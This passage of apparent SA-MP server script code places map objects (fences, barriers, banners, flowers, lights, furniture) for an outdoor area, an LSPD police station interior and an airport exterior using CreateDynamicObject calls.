    CreateDynamicObject(7288,1225.50000000,-1805.00000000,48.00000000,0.00000000,0.00000000,101.74990845); //object(vgs_fmtcasgn) (4)
    CreateDynamicObject(7288,1258.50000000,-1735.90002441,16.20000076,0.00000000,0.00000000,270.00000000); //object(vgs_fmtcasgn) (6)
    CreateDynamicObject(7288,1277.30004883,-1761.90002441,16.20000076,0.00000000,0.00000000,180.00000000); //object(vgs_fmtcasgn) (7)
    CreateDynamicObject(984,1230.40002441,-1842.30004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1243.19995117,-1842.30004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1256.00000000,-1842.30004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1281.69995117,-1842.50000000,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1288.09997559,-1836.09997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1288.09997559,-1823.30004883,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1288.09997559,-1810.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1288.09997559,-1797.69995117,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1282.09997559,-1789.09997559,13.19999981,0.00000000,0.00000000,70.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(984,1270.09997559,-1784.69995117,13.19999981,0.00000000,0.00000000,69.99938965); //object(fenceshit2) (1)
    CreateDynamicObject(3749,1269.40002441,-1842.09997559,18.29999924,0.00000000,0.00000000,357.50000000); //object(clubgate01_lax) (1)
    CreateDynamicObject(3749,1213.59997559,-1841.80004883,18.29999924,0.00000000,0.00000000,0.00000000); //object(clubgate01_lax) (2)
    CreateDynamicObject(1251,1267.00000000,-1796.80004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (1)
    CreateDynamicObject(1251,1272.00000000,-1796.69995117,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (2)
    CreateDynamicObject(1251,1277.09997559,-1796.80004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (3)
    CreateDynamicObject(1251,1282.69995117,-1796.80004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (4)
    CreateDynamicObject(1251,1261.59997559,-1796.80004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (5)
    CreateDynamicObject(1251,1257.19995117,-1803.59997559,12.50000000,0.00000000,0.00000000,44.00000000); //object(smashbar) (6)
    CreateDynamicObject(1251,1252.59997559,-1806.90002441,12.50000000,0.00000000,0.00000000,43.99475098); //object(smashbar) (7)
    CreateDynamicObject(1251,1247.69995117,-1810.19995117,12.50000000,0.00000000,0.00000000,43.99475098); //object(smashbar) (8)
    CreateDynamicObject(1251,1242.40002441,-1812.50000000,12.50000000,0.00000000,0.00000000,43.99475098); //object(smashbar) (9)
    CreateDynamicObject(1251,1279.30004883,-1826.30004883,12.39999962,0.00000000,0.00000000,91.99475098); //object(smashbar) (11)
    CreateDynamicObject(1251,1279.50000000,-1820.50000000,12.39999962,0.00000000,0.00000000,91.99401855); //object(smashbar) (12)
    CreateDynamicObject(1251,1279.40002441,-1814.30004883,12.39999962,0.00000000,0.00000000,91.99401855); //object(smashbar) (13)
    CreateDynamicObject(1251,1279.30004883,-1808.59997559,12.39999962,0.00000000,0.00000000,91.99401855); //object(smashbar) (14)
    CreateDynamicObject(1251,1198.30004883,-1833.50000000,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (15)
    CreateDynamicObject(1251,1198.30004883,-1829.30004883,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (16)
    CreateDynamicObject(1251,1198.50000000,-1825.40002441,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (17)
    CreateDynamicObject(1251,1198.09997559,-1837.19995117,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (18)
    CreateDynamicObject(1251,1256.80004883,-1833.80004883,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (19)
    CreateDynamicObject(1251,1252.09997559,-1834.00000000,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (20)
    CreateDynamicObject(1251,1247.00000000,-1834.19995117,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (21)
    CreateDynamicObject(1251,1242.09997559,-1834.19995117,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (22)
    CreateDynamicObject(1251,1237.80004883,-1834.30004883,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (23)
    CreateDynamicObject(1251,1233.00000000,-1834.40002441,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (24)
    CreateDynamicObject(1251,1227.09997559,-1834.19995117,12.39999962,0.00000000,0.00000000,0.00000000); //object(smashbar) (25)
    CreateDynamicObject(4641,1202.00000000,-1843.19995117,14.30000019,0.00000000,0.00000000,0.00000000); //object(paypark_lan04) (1)
    CreateDynamicObject(3437,1212.59997559,-1818.69995117,11.60000038,0.00000000,0.00000000,91.99707031); //object(ballypllr01_lvs) (2)
    CreateDynamicObject(3437,1259.50000000,-1790.19995117,14.89999962,0.00000000,0.00000000,217.74340820); //object(ballypllr01_lvs) (2)
    CreateDynamicObject(3437,1259.50000000,-1790.19995117,26.60000038,0.00000000,0.00000000,217.73803711); //object(ballypllr01_lvs) (2)
    CreateDynamicObject(3437,1212.59997559,-1818.69995117,23.29999924,0.00000000,0.00000000,91.99401855); //object(ballypllr01_lvs) (2)
    CreateDynamicObject(3850,1190.09997559,-1739.00000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (2)
    CreateDynamicObject(3850,1192.30004883,-1740.69995117,13.60000038,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (3)
    CreateDynamicObject(3850,1190.09997559,-1734.69995117,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (4)
    CreateDynamicObject(3850,1190.09997559,-1729.90002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (5)
    CreateDynamicObject(3850,1190.09997559,-1725.40002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (6)
    CreateDynamicObject(3850,1191.80004883,-1722.40002441,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (7)
    CreateDynamicObject(3850,1196.40002441,-1722.50000000,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (8)
    CreateDynamicObject(3850,1200.80004883,-1722.50000000,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (9)
    CreateDynamicObject(3850,1205.09997559,-1722.50000000,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (10)
    CreateDynamicObject(3850,1207.30004883,-1724.50000000,13.60000038,0.00000000,0.00000000,180.00000000); //object(carshowbann_sfsx) (11)
    CreateDynamicObject(3850,1205.19995117,-1726.59997559,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (12)
    CreateDynamicObject(3850,1200.69995117,-1726.59997559,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (13)
    CreateDynamicObject(3850,1196.30004883,-1726.59997559,13.60000038,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (14)
    CreateDynamicObject(3850,1194.30004883,-1729.19995117,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (15)
    CreateDynamicObject(3850,1194.30004883,-1733.59997559,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (16)
    CreateDynamicObject(3850,1194.30004883,-1737.90002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (17)
    CreateDynamicObject(870,1191.90002441,-1724.90002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (1)
    CreateDynamicObject(870,1191.90002441,-1728.50000000,13.30000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (2)
    CreateDynamicObject(870,1192.30004883,-1737.90002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (3)
    CreateDynamicObject(870,1195.40002441,-1724.40002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (4)
    CreateDynamicObject(870,1202.19995117,-1724.59997559,13.30000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (5)
    CreateDynamicObject(870,1205.19995117,-1724.50000000,13.30000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (6)
    CreateDynamicObject(1215,1190.19995117,-1722.90002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (1)
    CreateDynamicObject(1215,1190.19995117,-1727.59997559,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (2)
    CreateDynamicObject(1215,1190.19995117,-1732.40002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (3)
    CreateDynamicObject(1215,1190.19995117,-1736.90002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (4)
    CreateDynamicObject(1215,1194.19995117,-1740.30004883,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (5)
    CreateDynamicObject(1215,1194.19995117,-1735.80004883,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (6)
    CreateDynamicObject(1215,1194.09997559,-1731.40002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (7)
    CreateDynamicObject(1215,1194.19995117,-1726.90002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (8)
    CreateDynamicObject(1215,1198.50000000,-1726.50000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (9)
    CreateDynamicObject(1215,1202.90002441,-1726.59997559,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (10)
    CreateDynamicObject(1215,1207.30004883,-1726.50000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (11)
    CreateDynamicObject(1215,1202.90002441,-1722.50000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (12)
    CreateDynamicObject(1215,1198.59997559,-1722.59997559,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (13)
    CreateDynamicObject(1215,1194.09997559,-1722.50000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (14)

	//                          LSPD Interior
	CreateDynamicObject(2945,241.69921875,119.19921875,1005.29998779,0.00000000,0.00000000,0.00000000); //object(kmb_netting) (1)
	CreateDynamicObject(2945,245.39999390,119.19999695,1005.29998779,0.00000000,0.00000000,0.00000000); //object(kmb_netting) (2)
	CreateDynamicObject(2945,248.89999390,119.19999695,1005.29998779,0.00000000,0.00000000,0.00000000); //object(kmb_netting) (3)
	CreateDynamicObject(2945,251.39999390,119.19999695,1005.29998779,0.00000000,0.00000000,0.00000000); //object(kmb_netting) (4)
	CreateDynamicObject(1704,241.80000305,121.00000000,1002.29998779,0.00000000,0.00000000,0.00000000); //object(kb_chair03) (1)
	CreateDynamicObject(1704,246.10000610,121.00000000,1002.29998779,0.00000000,0.00000000,0.00000000); //object(kb_chair03) (2)
	CreateDynamicObject(1704,250.30000305,121.09999847,1002.29998779,0.00000000,0.00000000,0.00000000); //object(kb_chair03) (3)
	CreateDynamicObject(2190,246.80000305,119.40000153,1003.40002441,0.00000000,0.00000000,178.00000000); //object(pc_1) (2)
	CreateDynamicObject(2190,251.30000305,119.40000153,1003.40002441,0.00000000,0.00000000,177.99499512); //object(pc_1) (3)
	CreateDynamicObject(2190,243.10000610,119.30000305,1003.40002441,0.00000000,0.00000000,177.99499512); //object(pc_1) (4)
	CreateDynamicObject(2202,240.19999695,122.30000305,1002.20001221,0.00000000,0.00000000,90.00000000); //object(photocopier_2) (1)
	CreateDynamicObject(1491,236.80000305,119.19999695,1002.20001221,0.00000000,0.00000000,0.00000000); //object(gen_doorint01) (1)
	CreateDynamicObject(1649,239.69999695,113.00000000,1005.40002441,0.00000000,0.00000000,90.00000000); //object(wglasssmash) (1)
	CreateDynamicObject(1649,239.69999695,113.00000000,1005.40002441,0.00000000,0.00000000,270.00000000); //object(wglasssmash) (3)
	CreateDynamicObject(1649,253.10000610,117.59999847,1005.40002441,0.00000000,0.00000000,270.00000000); //object(wglasssmash) (4)
	CreateDynamicObject(1649,253.10000610,117.59999847,1005.50000000,0.00000000,0.00000000,90.00000000); //object(wglasssmash) (5)
	CreateDynamicObject(1491,233.09960938,119.19921875,1002.20001221,0.00000000,0.00000000,0.00000000); //object(gen_doorint01) (2)
	CreateDynamicObject(3077,260.20001221,109.19999695,1002.20001221,0.00000000,0.00000000,90.00000000); //object(nf_blackboard) (1)
	CreateDynamicObject(2614,252.89999390,113.40000153,1004.40002441,0.00000000,0.00000000,270.00000000); //object(cj_us_flag) (1)
	CreateDynamicObject(1622,252.69999695,118.50000000,1006.90002441,0.00000000,0.00000000,346.00000000); //object(nt_securecam2_01) (1)
	CreateDynamicObject(2412,245.10000610,107.69999695,1002.20001221,0.00000000,0.00000000,0.00000000); //object(cj_detector) (1)
	CreateDynamicObject(2412,248.39999390,107.80000305,1002.20001221,0.00000000,0.00000000,0.00000000); //object(cj_detector) (2)
	CreateDynamicObject(2141,272.59960938,120.39941406,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_kitch2_l) (1)
	CreateDynamicObject(2151,271.19921875,120.79980469,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_k5_low_unit2) (1)
	CreateDynamicObject(2154,273.59960938,120.69921875,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_k5_low_unit1) (1)
	CreateDynamicObject(2155,274.89999390,120.69999695,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_k5_low_unit4) (1)
	CreateDynamicObject(2533,271.10000610,118.69999695,1003.59997559,0.00000000,0.00000000,89.99996948); //object(cj_off2_lic_1_l) (1)
	CreateDynamicObject(1549,274.79998779,120.40000153,1004.50000000,0.00000000,0.00000000,0.00000000); //object(cj_ashtray_b) (1)
	CreateDynamicObject(1789,273.70001221,122.09999847,1004.20001221,0.00000000,0.00000000,90.00000000); //object(cj_chambermaid) (1)
	CreateDynamicObject(1778,273.79998779,121.80000305,1003.90002441,0.00000000,0.00000000,0.00000000); //object(cj_mop_pail) (2)
	CreateDynamicObject(1808,275.39999390,120.40000153,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_watercooler2) (1)
	CreateDynamicObject(2596,274.00000000,120.80000305,1006.09997559,0.00000000,0.00000000,0.00000000); //object(cj_sex_tv) (1)
	CreateDynamicObject(2713,273.70001221,122.09999847,1004.70001221,0.00000000,0.00000000,0.00000000); //object(cj_bucket) (2)
	CreateDynamicObject(16779,273.00000000,119.69999695,1007.20001221,0.00000000,0.00000000,0.00000000); //object(ufo_light02) (1)
	CreateDynamicObject(2867,271.50000000,120.50000000,1004.70001221,0.00000000,0.00000000,322.00000000); //object(gb_foodwrap05) (1)
	CreateDynamicObject(2644,271.29998779,116.50000000,1004.00000000,0.00000000,0.00000000,0.00000000); //object(cj_burg_table) (1)
	CreateDynamicObject(2788,272.60000610,116.50000000,1004.09997559,0.00000000,0.00000000,0.00000000); //object(cj_burg_chair) (1)
	CreateDynamicObject(2788,271.20001221,117.90000153,1004.09997559,0.00000000,0.00000000,90.00000000); //object(cj_burg_chair) (2)
	CreateDynamicObject(2858,271.29998779,116.50000000,1004.40002441,0.00000000,0.00000000,0.00000000); //object(gb_kitchtakeway03) (2)
	CreateDynamicObject(2685,273.79998779,120.69999695,1005.29998779,0.00000000,0.00000000,0.00000000); //object(cj_food_post1) (1)
	CreateDynamicObject(1523,275.79998779,121.30000305,1003.59997559,0.00000000,0.00000000,92.00000000); //object(gen_doorext10) (1)
	CreateDynamicObject(10154,263.50000000,120.50000000,1006.40002441,0.00000000,0.00000000,180.00000000); //object(pier69gdr) (1)
	CreateDynamicObject(1523,264.89999390,115.80000305,1003.59997559,0.00000000,0.00000000,0.00000000); //object(gen_doorext10) (3)
	CreateDynamicObject(3051,267.00000000,115.80000305,1005.00000000,0.00000000,0.00000000,316.00000000); //object(lift_dr) (1)
	CreateDynamicObject(2517,269.79998779,115.59999847,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_shower1) (1)
	CreateDynamicObject(2517,269.79998779,119.30000305,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_shower1) (2)
	CreateDynamicObject(2524,266.50000000,120.30000305,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_b_sink4) (1)
	CreateDynamicObject(2524,265.29998779,120.30000305,1003.59997559,0.00000000,0.00000000,0.00000000); //object(cj_b_sink4) (2)
	CreateDynamicObject(2525,264.20001221,117.59999847,1003.59997559,0.00000000,0.00000000,90.00000000); //object(cj_toilet4) (1)
	CreateDynamicObject(2631,267.00000000,118.40000153,1003.59997559,0.00000000,0.00000000,180.00000000); //object(gym_mat1) (1)
	CreateDynamicObject(18035,283.70001221,-57.20000076,1004.90002441,0.00000000,0.00000000,270.00000000); //object(munation_xtras2) (2)
	CreateDynamicObject(2952,271.50000000,112.59999847,1003.59997559,0.00000000,0.00000000,270.00000000); //object(kmb_gimpdoor) (1)
	CreateDynamicObject(2628,261.20001221,111.40000153,1003.59997559,0.00000000,0.00000000,0.00000000); //object(gym_bench2) (1)
	CreateDynamicObject(2628,262.89999390,111.30000305,1003.59997559,0.00000000,0.00000000,0.00000000); //object(gym_bench2) (2)
	CreateDynamicObject(2630,261.50000000,107.69999695,1003.59997559,0.00000000,0.00000000,92.00000000); //object(gym_bike) (1)
	CreateDynamicObject(2630,261.50000000,108.69999695,1003.59997559,0.00000000,0.00000000,91.99951172); //object(gym_bike) (2)
	CreateDynamicObject(2700,267.89999390,110.00000000,1006.40002441,0.00000000,10.00000000,172.00000000); //object(cj_sex_tv2) (1)
	CreateDynamicObject(2627,267.60000610,111.09999847,1003.59997559,0.00000000,0.00000000,0.00000000); //object(gym_treadmill) (1)
	CreateDynamicObject(2632,264.89999390,109.59999847,1003.70001221,0.00000000,0.00000000,269.99996948); //object(gym_mat02) (1)
	CreateDynamicObject(1491,225.10000610,116.00000000,1002.20001221,0.00000000,0.00000000,0.00000000); //object(gen_doorint01) (2)
	CreateDynamicObject(2904,257.00000000,125.19999695,1010.50000000,0.00000000,0.00000000,270.00000000); //object(warehouse_door1) (1)
	CreateDynamicObject(2904,257.00000000,125.19999695,1013.09997559,0.00000000,0.00000000,270.00000000); //object(warehouse_door1) (2)
	CreateDynamicObject(1722,252.50000000,112.59999847,1002.20001221,0.00000000,0.00000000,89.99450684); //object(off_chairnu) (10)
	CreateDynamicObject(14824,254.39999390,108.69999695,1004.00000000,0.00000000,90.00000000,90.00000000); //object(gym1_doorway) (1)
	CreateDynamicObject(1318,253.00000000,110.59999847,1003.09997559,0.00000000,0.00000000,0.00000000); //object(arrow) (1)
	CreateDynamicObject(1318,253.00000000,110.59999847,1004.40002441,359.99993896,180.00000000,180.00000000); //object(arrow) (3)
	CreateDynamicObject(2957,255.80000305,113.09999847,1003.79998779,0.00000000,0.00000000,0.00000000); //object(chinatgaragedoor) (2)
	CreateDynamicObject(2957,255.80000305,113.09999847,1007.00000000,0.00000000,0.00000000,0.00000000); //object(chinatgaragedoor) (3)
	CreateDynamicObject(1557,244.89999390,107.00000000,1002.20001221,0.00000000,0.00000000,0.00000000); //object(gen_doorext19) (1)
	CreateDynamicObject(1557,247.89999390,107.00000000,1002.20001221,0.00000000,0.00000000,180.00000000); //object(gen_doorext19) (2)
	CreateDynamicObject(2634,227.60000610,126.09999847,1003.50000000,0.00000000,0.00000000,270.00000000); //object(ab_vaultdoor) (1)
	CreateDynamicObject(9625,227.60000610,128.50000000,1005.59997559,0.00000000,0.00000000,0.00000000); //object(spdr_sfw) (1)
	CreateDynamicObject(3051,267.00000000,115.80000305,1005.00000000,0.00000000,0.00000000,316.00000000); //object(lift_dr) (1)
	CreateDynamicObject(3051,239.50000000,118.59999847,1003.59997559,0.00000000,0.00000000,45.99975586); //ascensor cerrado 1

	//							AEROPUERTO EXT.
    CreateDynamicObject(18284,1392.19921875,-2313.59960938,15.50000000,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (1)
    CreateDynamicObject(18284,1408.69995117,-2313.50000000,15.39999962,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (2)
    CreateDynamicObject(18284,1407.69995117,-2348.19995117,15.39999962,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (3)
    CreateDynamicObject(18284,1391.19921875,-2348.29980469,15.50000000,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (4)
    CreateDynamicObject(18284,1391.09997559,-2262.19995117,15.50000000,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (5)
    CreateDynamicObject(18284,1407.59960938,-2262.09960938,15.39999962,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (6)
    CreateDynamicObject(18284,1407.90002441,-2223.30004883,15.50000000,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (7)
    CreateDynamicObject(18284,1391.40002441,-2223.19995117,15.39999962,0.00000000,0.00000000,270.00000000); //object(cw_tscanopy) (8)
    CreateDynamicObject(970,1416.30004883,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (1)
    CreateDynamicObject(970,1412.29980469,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (2)
    CreateDynamicObject(970,1408.19921875,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1404.09997559,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (4)
    CreateDynamicObject(970,1400.00000000,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (5)
    CreateDynamicObject(970,1395.90002441,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (6)
    CreateDynamicObject(970,1391.80004883,-2296.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (7)
    CreateDynamicObject(970,1389.69995117,-2298.60009766,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (8)
    CreateDynamicObject(970,1389.69995117,-2302.69995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (9)
    CreateDynamicObject(970,1391.69995117,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (10)
    CreateDynamicObject(970,1395.80004883,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (11)
    CreateDynamicObject(970,1399.90002441,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (12)
    CreateDynamicObject(970,1404.00000000,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (13)
    CreateDynamicObject(970,1408.09997559,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (14)
    CreateDynamicObject(970,1412.19995117,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (15)
    CreateDynamicObject(970,1416.30004883,-2304.80004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (16)
    CreateDynamicObject(970,1418.40002441,-2302.69995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (17)
    CreateDynamicObject(970,1418.40002441,-2298.60009766,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (19)
    CreateDynamicObject(870,1416.00000000,-2300.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (1)
    CreateDynamicObject(870,1416.59997559,-2298.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (2)
    CreateDynamicObject(870,1414.40002441,-2298.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (3)
    CreateDynamicObject(870,1413.50000000,-2301.10009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (4)
    CreateDynamicObject(870,1414.80004883,-2302.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (5)
    CreateDynamicObject(870,1411.90002441,-2302.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (6)
    CreateDynamicObject(870,1411.50000000,-2299.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (7)
    CreateDynamicObject(870,1409.69995117,-2298.10009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (8)
    CreateDynamicObject(870,1412.50000000,-2297.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (9)
    CreateDynamicObject(870,1409.80004883,-2301.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (10)
    CreateDynamicObject(870,1409.80004883,-2303.30004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (11)
    CreateDynamicObject(870,1408.00000000,-2300.30004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (12)
    CreateDynamicObject(870,1406.00000000,-2302.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (13)
    CreateDynamicObject(870,1405.30004883,-2299.19995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (14)
    CreateDynamicObject(870,1407.30004883,-2302.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (15)
    CreateDynamicObject(870,1407.69995117,-2297.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (16)
    CreateDynamicObject(870,1405.69995117,-2297.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (17)
    CreateDynamicObject(870,1403.90002441,-2297.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (18)
    CreateDynamicObject(870,1404.00000000,-2302.00000000,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (19)
    CreateDynamicObject(870,1402.30004883,-2300.10009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (20)
    CreateDynamicObject(870,1401.19995117,-2302.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (21)
    CreateDynamicObject(870,1401.80004883,-2297.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (22)
    CreateDynamicObject(870,1399.80004883,-2299.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (23)
    CreateDynamicObject(870,1399.19995117,-2302.10009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (24)
    CreateDynamicObject(870,1396.50000000,-2302.50000000,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (25)
    CreateDynamicObject(870,1397.90002441,-2300.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (26)
    CreateDynamicObject(870,1396.59997559,-2298.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (27)
    CreateDynamicObject(870,1398.30004883,-2297.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (28)
    CreateDynamicObject(870,1395.30004883,-2300.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (29)
    CreateDynamicObject(870,1394.00000000,-2298.39990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (30)
    CreateDynamicObject(870,1391.50000000,-2298.10009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (31)
    CreateDynamicObject(870,1392.40002441,-2301.10009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (32)
    CreateDynamicObject(870,1391.30004883,-2299.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (33)
    CreateDynamicObject(870,1391.30004883,-2303.19995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (34)
    CreateDynamicObject(870,1394.19995117,-2303.19995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (35)
    CreateDynamicObject(1597,1412.19995117,-2286.30004883,15.00000000,0.00000000,0.00000000,270.00000000); //object(cntrlrsac1) (1)
    CreateDynamicObject(1597,1397.79980469,-2286.29980469,15.00000000,0.00000000,0.00000000,270.00000000); //object(cntrlrsac1) (2)
    CreateDynamicObject(1597,1383.19995117,-2286.10009766,15.00000000,0.00000000,0.00000000,270.00000000); //object(cntrlrsac1) (3)
    CreateDynamicObject(11489,1357.59960938,-2285.59960938,12.50000000,0.00000000,0.00000000,91.99951172); //object(dam_statues) (1)
    CreateDynamicObject(3877,1398.50000000,-2300.60009766,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
    CreateDynamicObject(3877,1403.69995117,-2300.39990234,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (2)
    CreateDynamicObject(3877,1409.00000000,-2301.89990234,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (3)
